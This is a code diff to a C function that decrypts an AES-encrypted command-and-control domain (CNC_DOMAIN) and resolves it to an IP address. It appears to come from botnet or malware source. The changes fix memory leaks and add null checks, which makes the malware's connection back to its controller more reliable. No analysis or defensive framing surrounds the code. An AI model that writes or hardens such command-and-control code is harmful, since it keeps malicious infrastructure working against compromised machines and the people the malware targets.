@@ -142,22 +142,26 @@ int resolve_server_address(struct sockaddr_in *server_addr, int consecutive_fail
     }
 
     char *decrypted_domain = aes_decrypt_hex_string(AES_KEY, CNC_DOMAIN);
+    if (!decrypted_domain) return 0;
+
     char *resolved_ip = resolv_with_retry(decrypted_domain);
     if (resolved_ip && inet_pton(AF_INET, resolved_ip, &server_addr->sin_addr) == 1) {
         strncpy(cached_ip, resolved_ip, INET_ADDRSTRLEN - 1);
         last_successful_resolve = now;
+        free(resolved_ip);
         free(decrypted_domain);
         return 1;
     }
+    free(resolved_ip);
 
     if (consecutive_failures > 5) {
-        struct addrinfo hints, *result;
+        struct addrinfo hints, *result = NULL;
         memset(&hints, 0, sizeof(hints));
         hints.ai_family = AF_INET;
         hints.ai_socktype = SOCK_STREAM;
-        
+
         int status = getaddrinfo(decrypted_domain, NULL, &hints, &result);
-        if (status == 0) {
+        if (status == 0 && result) {
             struct sockaddr_in* addr_in = (struct sockaddr_in*)result->ai_addr;
             server_addr->sin_addr = addr_in->sin_addr;
             inet_ntop(AF_INET, &server_addr->sin_addr, cached_ip, INET_ADDRSTRLEN);
@@ -166,10 +170,10 @@ int resolve_server_address(struct sockaddr_in *server_addr, int consecutive_fail
             free(decrypted_domain);
             return 1;
         }
-        free(decrypted_domain);
         if (result) freeaddrinfo(result);
     }
-    
+
+    free(decrypted_domain);
     return 0;
 }
 
